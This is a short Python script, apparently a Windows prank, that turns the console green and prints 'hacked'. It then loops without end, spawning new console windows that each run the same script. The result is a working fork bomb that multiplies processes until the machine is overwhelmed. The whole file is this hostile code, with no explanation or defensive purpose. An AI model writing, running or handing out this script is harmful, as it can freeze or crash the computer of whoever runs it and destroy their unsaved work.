import subprocess, sys, os
os.system("color A")
print("hacked")
while True:
    print("hacked")
    subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)